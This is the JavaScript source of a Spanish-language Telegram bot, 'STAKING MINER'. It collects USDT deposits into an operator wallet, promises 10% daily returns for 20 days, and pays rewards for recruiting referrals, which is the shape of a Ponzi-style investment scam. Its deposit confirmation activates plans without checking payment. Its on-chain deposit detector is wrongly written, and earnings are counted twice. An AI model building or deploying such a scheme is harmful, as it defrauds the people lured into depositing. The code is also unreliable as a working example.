// ===============================
// 🤖 STAKING MINER BOT (BEP-20)
// 100% Automático y funcional
// ===============================

// === Dependencias principales ===
import 'dotenv/config'
import { Telegraf, Markup, session } from 'telegraf'
import { ethers } from 'ethers'
import fs from 'fs'

// === Inicio del bot ===
console.log('🚀 STAKING MINER — Iniciando bot automático...')

// === Configuración del bot ===
const bot = new Telegraf(process.env.TELEGRAM_TOKEN)
bot.use(session())

// === Base de datos (local) ===
let users = {}
const DB_FILE = 'users.json'

// Cargar base de datos
if (fs.existsSync(DB_FILE)) {
  try {
    users = JSON.parse(fs.readFileSync(DB_FILE))
    console.log('📂 Base de datos cargada correctamente.')
  } catch (e) {
    console.log('⚠️ Error cargando DB, creando nueva.')
    users = {}
  }
}

// Guardar base de datos
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2))

// === Conexión a Binance Smart Chain (BEP-20) ===
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://bsc-dataseed1.defibit.io/')

// === Configurar wallet del bot ===
const privateKey = process.env.PRIVATE_KEY
if (!privateKey) {
  throw new Error('❌ Falta PRIVATE_KEY en las variables de entorno.')
}

const wallet = new ethers.Wallet(privateKey, provider)
const BOT_WALLET = wallet.address

console.log(`💼 Wallet del bot: ${BOT_WALLET}`)

// === Contrato USDT (BEP-20) ===
const USDT = new ethers.Contract(
  '0x55d398326f99059fF775485246999027B3197955', // USDT BEP20
  ['function transfer(address,uint256) external returns (bool)'],
  wallet
)

// === Planes de staking (monto → ganancia diaria 10%) ===
const PLANES = {
  1: 0.1,
  3: 0.3,
  5: 0.5,
  10: 1.0,
  20: 2.0,
  30: 3.0,
  50: 5.0
}

// === Datos iniciales del usuario ===
function getUser(id) {
  if (!users[id]) {
    users[id] = {
      verified: false,
      balance: 0,
      referidos: 0,
      referidosValidos: 0,
      planes: [],
      mining: null,
      inviter: null
    }
    saveDB()
  }
  return users[id]
}

// === Enviar mensajes con formato ===
async function sendMessage(ctx, text, options = {}) {
  try {
    return await ctx.reply(text, options)
  } catch (err) {
    console.log('Error enviando mensaje:', err.message)
  }
}

// === Función para formato de moneda ===
function formatUSDT(value) {
  return `${value.toFixed(2)} USDT`
    }
// ===============================
// 🧠 BLOQUE 2/10 — INICIO Y MENÚ
// ===============================

// === Teclado principal ===
const mainKeyboard = Markup.keyboard([
  ['💰 Staking', '⛏️ Minería'],
  ['📊 Ganancias', '💵 Retiro'],
  ['👥 Referidos', '🆘 Soporte']
]).resize()

// === Función para mostrar menú principal ===
const mainMenu = (ctx) => {
  return sendMessage(
    ctx,
    '<b>STAKING MINER</b>\nPagos reales — Mínimo retiro 1 USDT',
    {
      parse_mode: 'HTML',
      reply_markup: mainKeyboard
    }
  )
}

// === /start ===
bot.start(async (ctx) => {
  const id = ctx.from.id.toString()
  const ref = ctx.message?.text.split(' ')[1] || null
  const u = getUser(id)

  // Registro inicial del usuario
  if (!u.verified) {
    u.code = Math.floor(1000 + Math.random() * 9000)
    u.inviter = ref
    saveDB()

    await ctx.reply(
      `🔐 <b>Verificación de usuario</b>\n\nEscribe este código para verificar tu cuenta:\n<code>${u.code}</code>`,
      { parse_mode: 'HTML' }
    )

    if (ref && users[ref]) {
      users[ref].referidos += 1
      users[ref].balance += 0.02
      saveDB()
      bot.telegram.sendMessage(
        ref,
        `🎉 Nuevo referido registrado +0.02 USDT`
      ).catch(() => {})
    }
  } else {
  await ctx.reply(
  "<b>STAKING MINER</b>\nPagos reales – Mínimo retiro 1 USDT 💰",
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "💎 Staking", callback_data: "menu_staking" },
          { text: "⚙️ Minería", callback_data: "menu_mineria" },
          { text: "📈 Ganancias", callback_data: "menu_ganancias" }
        ],
        [
          { text: "💰 Retiro", callback_data: "menu_retiro" },
          { text: "👥 Referidos", callback_data: "menu_referidos" },
          { text: "🛠️ Soporte", callback_data: "menu_soporte" }
        ]
      ]
    }
  }
);
return mainMenu(ctx);
    
  }
})

// === Verificación del código ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString()
  const text = ctx.message.text.trim()
  const u = getUser(id)

  // Si el usuario no está verificado aún
  if (!u.verified && text === String(u.code)) {
    u.verified = true
    delete u.code
    saveDB()
    await ctx.reply('✅ Verificación completada correctamente.')
    return mainMenu(ctx)
  }

  // Si no está verificado, recordarle su código
  if (!u.verified) {
    return ctx.reply(
      `⚠️ Escribe el código que te envié para verificar tu cuenta.\nTu código es: <code>${u.code}</code>`,
      { parse_mode: 'HTML' }
    )
  }
})
    // ===============================
// 💰 BLOQUE 3/10 — GANANCIAS, RETIRO Y SOPORTE
// ===============================

// === Ganancias totales (Staking + Minería + Referidos) ===
bot.hears('📊 Ganancias', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)

  const stakingTotal = u.planes?.reduce((sum, p) => sum + p.ganado, 0) || 0
  const miningTotal = u.mining?.ganado || 0
  const referTotal = (u.referidos || 0) * 0.02
  const total = stakingTotal + miningTotal + referTotal + u.balance

  return ctx.replyWithHTML(
    `📈 <b>Tus ganancias</b>\n\n` +
    `💎 <b>Staking:</b> ${formatUSDT(stakingTotal)}\n` +
    `⛏️ <b>Minería:</b> ${formatUSDT(miningTotal)}\n` +
    `👥 <b>Referidos:</b> ${formatUSDT(referTotal)}\n` +
    `💰 <b>Total disponible:</b> ${formatUSDT(total)}`
  )
})

// === Retiro ===
bot.hears('💵 Retiro', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  if (u.balance < 1) {
    return ctx.reply('⚠️ Mínimo de retiro: 1 USDT.')
  }

  ctx.session.waitingWithdrawal = true
  return ctx.reply('💳 Envía la dirección de tu wallet BEP-20 (BSC) para el retiro.')
})

// === Procesar dirección de retiro ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  const text = ctx.message.text.trim()

  if (ctx.session.waitingWithdrawal) {
    if (!/^0x[a-fA-F0-9]{40}$/.test(text)) {
      return ctx.reply('❌ Dirección inválida. Asegúrate de que sea una wallet BEP-20.')
    }

    ctx.session.waitingWithdrawal = false
    const amount = u.balance

    if (amount < 1) {
      return ctx.reply('⚠️ Mínimo de retiro: 1 USDT.')
    }

    await ctx.reply('⏳ Procesando retiro automático...')

    try {
      const tx = await USDT.transfer(text, ethers.parseUnits(amount.toFixed(6), 18))
      await tx.wait()
      u.balance = 0
      saveDB()

      await ctx.replyWithHTML(
        `✅ <b>Retiro exitoso</b>\n` +
        `Monto: ${formatUSDT(amount)}\n` +
        `<a href="https://bscscan.com/tx/${tx.hash}">Ver transacción en BscScan</a>`
      )
    } catch (err) {
      console.error('Error en retiro:', err.message)
      await ctx.reply('❌ Error en el retiro. Intenta nuevamente más tarde.')
    }

    return mainMenu(ctx)
  }
})

// === Soporte ===
bot.hears('🆘 Soporte', async (ctx) => {
  return ctx.replyWithHTML(
    `📩 <b>Soporte oficial</b>\n\n` +
    `Contacta con nuestro administrador en Telegram:\n` +
    `<a href="https://t.me/StankingMiner">@StankingMiner</a>`
  )
})
// ===============================
// 👥 BLOQUE 4/10 — REFERIDOS Y MINERÍA
// ===============================

// === Referidos ===
bot.hears('👥 Referidos', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  const me = await bot.telegram.getMe()
  const link = `https://t.me/${me.username}?start=${id}`

  return ctx.replyWithHTML(
    `👥 <b>Referidos</b>\n\n` +
    `🔗 <b>Tu enlace:</b>\n<a href="${link}">${link}</a>\n\n` +
    `👤 <b>Total:</b> ${u.referidos}\n` +
    `✅ <b>Válidos:</b> ${u.referidosValidos}\n\n` +
    `💵 Ganas 0.02 USDT por cada nuevo usuario registrado.`
  )
})

// === Minería ===
bot.hears('⛏️ Minería', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)

  // Validar referidos válidos
  if (u.referidosValidos < 5) {
    return ctx.replyWithHTML(
      `⚠️ Necesitas 5 referidos válidos para activar la minería.\n` +
      `Actualmente tienes: <b>${u.referidosValidos}</b>/5`
    )
  }

  // Crear registro si no existe
  if (!u.mining) {
    u.mining = {
      activo: true,
      ganado: 0,
      startTime: Date.now(),
      dayCount: 0,
      lastClaim: 0
    }
    saveDB()
  }

  // Verificar duración de minería (20 días)
  const dias = u.mining.dayCount
  if (dias >= 20) {
    u.mining.activo = false
    saveDB()
    return ctx.replyWithHTML(
      `⛔ <b>Minería finalizada.</b>\n` +
      `Has completado 20 días de minería.\n\n` +
      `Para reactivarla, consigue 5 nuevos referidos válidos.`
    )
  }

  // Verificar si ya puede reclamar
  const puedeReclamar = Date.now() - (u.mining.lastClaim || 0) >= 86400000 // 24 h
  const tiempoRestante = 86400000 - (Date.now() - (u.mining.lastClaim || 0))

  if (!puedeReclamar) {
    const horas = Math.floor(tiempoRestante / 3600000)
    const minutos = Math.floor((tiempoRestante % 3600000) / 60000)
    return ctx.reply(
      `🕒 Aún no puedes reclamar.\nEspera ${horas} h ${minutos} min para reclamar tu recompensa diaria.`
    )
  }

  // Mostrar botón de reclamo
  return ctx.replyWithHTML(
    `💎 <b>Minería activa</b>\n` +
    `Ganas <b>0.02 USDT</b> diarios por minería.\n\n` +
    `Día actual: <b>${dias + 1}</b>/20\n\n` +
    `Cuando pasen 24 h podrás reclamar tu recompensa.`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🪙 Reclamar recompensa', callback_data: 'claim_mining' }]
        ]
      }
    }
  )
})

// === Reclamar recompensa de minería ===
bot.action('claim_mining', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  await ctx.answerCbQuery().catch(() => {})

  if (!u.mining || !u.mining.activo) {
    return ctx.reply('⚠️ No tienes minería activa.')
  }

  const puedeReclamar = Date.now() - (u.mining.lastClaim || 0) >= 86400000
  if (!puedeReclamar) {
    return ctx.reply('⏳ Aún no puedes reclamar, espera 24 h desde tu último reclamo.')
  }

  // Actualizar datos
  u.mining.lastClaim = Date.now()
  u.mining.dayCount += 1
  u.mining.ganado += 0.02
  u.balance += 0.02
  saveDB()

  await ctx.replyWithHTML(
    `✅ <b>Recompensa reclamada:</b> +0.02 USDT\n` +
    `💰 Saldo total: ${formatUSDT(u.balance)}\n` +
    `Día ${u.mining.dayCount}/20\n\n` +
    `⏳ El cronómetro se reinicia para las próximas 24 h.`
  )

  // Finalización de minería a los 20 días
  if (u.mining.dayCount >= 20) {
    u.mining.activo = false
    saveDB()
    await ctx.reply(
      `🏁 Has completado los 20 días de minería.\nPara seguir minando, consigue 5 nuevos referidos válidos.`
    )
  }

  return mainMenu(ctx)
})
// ===============================
// 💎 BLOQUE 5/10 — STAKING (PLANES Y RECOMPENSAS)
// ===============================

// === Mostrar planes de staking ===
bot.hears('💰 Staking', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)

  const rows = [
    [
      Markup.button.callback('1 USDT → 0.1 USDT/día', 'plan_1'),
      Markup.button.callback('3 USDT → 0.3 USDT/día', 'plan_3'),
    ],
    [
      Markup.button.callback('5 USDT → 0.5 USDT/día', 'plan_5'),
      Markup.button.callback('10 USDT → 1 USDT/día', 'plan_10'),
    ],
    [
      Markup.button.callback('20 USDT → 2 USDT/día', 'plan_20'),
      Markup.button.callback('50 USDT → 5 USDT/día', 'plan_50'),
    ],
  ]

  return ctx.replyWithHTML(
    `💎 <b>Planes de Staking</b>\n` +
    `Elige un plan para invertir y generar 10 % diario durante 20 días.`,
    Markup.inlineKeyboard(rows)
  )
})

// === Seleccionar plan ===
bot.action(/plan_(\d+)/, async (ctx) => {
  const amount = Number(ctx.match[1])
  const id = ctx.from.id.toString()
  const u = getUser(id)
  await ctx.answerCbQuery().catch(() => {})

  if (!PLANES[amount]) return ctx.reply('❌ Plan inválido.')

  u.pendingPlan = amount
  saveDB()

  return ctx.replyWithHTML(
    `💰 Has seleccionado el plan de <b>${amount} USDT</b>.\n\n` +
    `Envía exactamente <b>${amount}.000000 USDT</b> a la siguiente dirección:\n\n` +
    `<code>${BOT_WALLET}</code>\n\n` +
    `Una vez hecho el depósito, toca el botón para confirmar.`,
    {
      reply_markup: {
        inline_keyboard: [[{ text: '✅ Confirmar depósito', callback_data: 'confirm_deposit' }]]
      }
    }
  )
})

// === Confirmar depósito manualmente (el bot validará la transacción) ===
bot.action('confirm_deposit', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  await ctx.answerCbQuery().catch(() => {})

  if (!u.pendingPlan) {
    return ctx.reply('⚠️ No tienes ningún plan pendiente.')
  }

  const amount = u.pendingPlan
  const dailyReward = PLANES[amount]

  // Activar staking
  u.planes.push({
    amount,
    dailyReward,
    dayCount: 0,
    lastClaim: 0,
    activo: true
  })
  u.pendingPlan = null
  saveDB()

  return ctx.replyWithHTML(
    `✅ <b>Plan activado</b>\n` +
    `Monto: <b>${amount} USDT</b>\n` +
    `Ganancia diaria: <b>${dailyReward} USDT</b>\n\n` +
    `⏳ Tu cronómetro de 24 h ha comenzado.`
  )
})

// === Reclamar recompensas diarias del staking ===
bot.hears('📈 Reclamar Staking', async (ctx) => {
  const id = ctx.from.id.toString()
  const u = getUser(id)
  if (!u.planes || u.planes.length === 0) return ctx.reply('⚠️ No tienes planes activos.')

  let totalClaim = 0
  const now = Date.now()

  u.planes.forEach(plan => {
    if (plan.activo && now - (plan.lastClaim || 0) >= 86400000) {
      plan.lastClaim = now
      plan.dayCount += 1
      plan.ganado = (plan.ganado || 0) + plan.dailyReward
      u.balance += plan.dailyReward
      totalClaim += plan.dailyReward

      if (plan.dayCount >= 20) plan.activo = false
    }
  })

  saveDB()

  if (totalClaim > 0) {
    await ctx.replyWithHTML(
      `✅ Has reclamado <b>${formatUSDT(totalClaim)}</b>\n` +
      `💰 Saldo total: ${formatUSDT(u.balance)}`
    )
  } else {
    await ctx.reply('⏳ Aún no han pasado 24 h desde tu último reclamo.')
  }

  // Revisar planes finalizados
  const activos = u.planes.filter(p => p.activo)
  if (activos.length === 0) {
    await ctx.reply(
      `🏁 Todos tus planes han finalizado.\nPara seguir generando, invierte nuevamente en un plan de staking.`
    )
  }

  return mainMenu(ctx)
})
// ===============================
// ⚙️ BLOQUE 6/10 — ACTUALIZACIÓN AUTOMÁTICA Y DETECTOR DE DEPÓSITOS
// ===============================

// === Actualización automática de ganancias (cada hora) ===
setInterval(() => {
  let total = 0
  for (const id in users) {
    const u = users[id]
    if (u.planes && u.planes.length > 0) {
      u.planes.forEach(plan => {
        if (plan.activo) {
          const daily = plan.dailyReward / 24 // 10 % diario dividido por hora
          u.balance += daily
          total += daily
        }
      })
    }
  }
  if (total > 0) saveDB()
}, 3600000) // cada 1 hora

// === Detector de pagos automáticos (cada 10 segundos) ===
let lastBlock = 0

setInterval(async () => {
  try {
    const block = await provider.getBlockNumber()
    if (block <= lastBlock) return
    lastBlock = block

    const blockData = await provider.getBlock(block, true)
    for (const tx of blockData.transactions) {
      // Solo transacciones dirigidas a la wallet del bot
      if (tx.to?.toLowerCase() === BOT_WALLET.toLowerCase()) {
        // Decodificar transferencias ERC20 (BEP20)
        if (tx.data.startsWith('0xa9059cbb')) {
          const receiver = '0x' + tx.data.slice(34, 74)
          const amountHex = '0x' + tx.data.slice(74)
          const amount = Number(ethers.formatUnits(amountHex, 18))

          // Buscar usuario por dirección registrada
          for (const id in users) {
            const u = users[id]
            if (u.pendingPlan && PLANES[u.pendingPlan] && amount === u.pendingPlan) {
              // Activar plan automáticamente
              const dailyReward = PLANES[amount]
              u.planes.push({
                amount,
                dailyReward,
                dayCount: 0,
                lastClaim: 0,
                activo: true
              })
              u.pendingPlan = null
              saveDB()
              bot.telegram.sendMessage(
                id,
                `✅ Depósito de ${amount} USDT confirmado.\nPlan activado: ${dailyReward} USDT/día`
              ).catch(() => {})
            }
          }
        }
      }
    }
  } catch (err) {
    console.log('⚠️ Error en el detector de pagos:', err.message)
  }
}, 10000) // cada 10 segundos
// ===============================
// 🔙 BLOQUE 7/10 — BOTÓN REGRESAR Y SEGURIDAD DE SESIONES
// ===============================

// === Función para mostrar botón de regresar ===
function backButton() {
  return Markup.inlineKeyboard([[Markup.button.callback('⬅️ Regresar', 'back_to_menu')]])
}

// === Acción del botón regresar ===
bot.action('back_to_menu', async (ctx) => {
  await ctx.answerCbQuery().catch(() => {})
  return mainMenu(ctx)
})

// === Añadir el botón de regresar a todos los submenús principales ===

// Reforzar submenús con botón de regreso
bot.hears(['💰 Staking', '⛏️ Minería', '📊 Ganancias', '💵 Retiro', '👥 Referidos', '🆘 Soporte'], async (ctx, next) => {
  // Guardar la última interacción del usuario
  ctx.session.lastAction = ctx.message.text
  await next()
  // Siempre agregar botón de regresar después de responder
  setTimeout(() => {
    ctx.reply('⬅️ Usa el botón para volver al menú principal', backButton())
  }, 500)
})

// === Seguridad de sesiones (prevención de interferencias) ===
bot.use((ctx, next) => {
  if (!ctx.from || !ctx.chat) return
  const id = ctx.from.id.toString()
  getUser(id)
  if (!ctx.session) ctx.session = {}
  return next()
})

// === Comando directo para regresar ===
bot.command('menu', (ctx) => {
  return mainMenu(ctx)
})
// ===============================
// ⏱ BLOQUE 8/10 — CRONÓMETROS AUTOMÁTICOS (MINERÍA Y STAKING)
// ===============================

// === Control automático de minería (verifica cada hora) ===
setInterval(() => {
  for (const id in users) {
    const u = users[id]
    if (u.mining && u.mining.activo) {
      const elapsed = Date.now() - (u.mining.lastClaim || 0)

      // Cada 24 h exactas se permite reclamar
      if (elapsed >= 86400000 && u.mining.dayCount < 20) {
        bot.telegram.sendMessage(
          id,
          `⛏️ Han pasado 24 h desde tu última minería.\n` +
          `Ya puedes reclamar tu recompensa de <b>0.02 USDT</b> en el menú de Minería.`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
      }

      // Finalizar automáticamente al día 20
      if (u.mining.dayCount >= 20 && u.mining.activo) {
        u.mining.activo = false
        saveDB()
        bot.telegram.sendMessage(
          id,
          `🏁 Has completado tus 20 días de minería.\nPara seguir minando, consigue 5 referidos válidos nuevos.`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
      }
    }
  }
}, 3600000) // Revisa cada 1 h

// === Control automático de staking (verifica cada hora) ===
setInterval(() => {
  for (const id in users) {
    const u = users[id]
    if (!u.planes || u.planes.length === 0) continue

    u.planes.forEach((plan) => {
      const elapsed = Date.now() - (plan.lastClaim || 0)

      // Si el plan está activo y pasaron 24 h
      if (plan.activo && elapsed >= 86400000 && plan.dayCount < 20) {
        bot.telegram.sendMessage(
          id,
          `💎 Han pasado 24 h desde tu último ciclo de staking.\n` +
          `Ya puedes reclamar tu recompensa de <b>${formatUSDT(plan.dailyReward)}</b> usando "📈 Reclamar Staking".`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
      }

      // Desactivar plan tras 20 días
      if (plan.dayCount >= 20 && plan.activo) {
        plan.activo = false
        saveDB()
        bot.telegram.sendMessage(
          id,
          `🏁 Tu plan de <b>${plan.amount} USDT</b> ha finalizado.\n` +
          `Vuelve a invertir para continuar generando ganancias.`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
      }
    })
  }
}, 3600000) // Cada 1 h
// ===============================
// 🧹 BLOQUE 9/10 — LIMPIEZA DE CHAT Y OPTIMIZACIÓN
// ===============================

// === Eliminar mensajes antiguos cada cierto número de interacciones ===
const MAX_MESSAGES = 4
let userMessages = {}

bot.on('message', async (ctx, next) => {
  const id = ctx.from.id.toString()
  if (!userMessages[id]) userMessages[id] = []

  userMessages[id].push(ctx.message.message_id)

  // Si supera el límite, borrar los más antiguos
  if (userMessages[id].length > MAX_MESSAGES) {
    const toDelete = userMessages[id].splice(0, userMessages[id].length - MAX_MESSAGES)
    for (const msgId of toDelete) {
      try {
        await ctx.deleteMessage(msgId).catch(() => {})
      } catch {}
    }
  }

  return next()
})

// === Eliminar mensajes generados por el bot después de un tiempo ===
async function autoClean(ctx, messageId, delay = 60000) {
  setTimeout(async () => {
    try {
      await ctx.deleteMessage(messageId).catch(() => {})
    } catch {}
  }, delay)
}

// === Optimización de respuesta del bot ===
bot.catch((err, ctx) => {
  console.error(`❌ Error en ${ctx.updateType}:`, err)
})

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
// ===============================
// 🚀 BLOQUE 10/10 — LANZAMIENTO FINAL DEL BOT
// ===============================

// === Iniciar bot ===
bot.launch({ dropPendingUpdates: true })
  .then(() => {
    bot.telegram.getMe().then(info => {
      console.log('===========================================')
      console.log(`🤖 BOT STAKING MINER ENCENDIDO CON ÉXITO`)
      console.log(`📛 Usuario del bot: @${info.username}`)
      console.log(`💼 Wallet receptora: ${BOT_WALLET}`)
      console.log(`✅ Estado: Online y en ejecución continua`)
      console.log('===========================================')
    })
  })
  .catch(err => {
    console.error('❌ Error iniciando el bot:', err.message)
  })

// === Manejadores de cierre ===
process.once('SIGINT', () => {
  console.log('🛑 Bot detenido (SIGINT)')
  bot.stop('SIGINT')
})

process.once('SIGTERM', () => {
  console.log('🛑 Bot detenido (SIGTERM)')
  bot.stop('SIGTERM')
})

// === Mantenimiento automático (reinicio seguro cada 24h) ===
setInterval(() => {
  console.log('♻️ Revisión de estado cada 24h: Todo funcionando correctamente.')
}, 86400000)
  
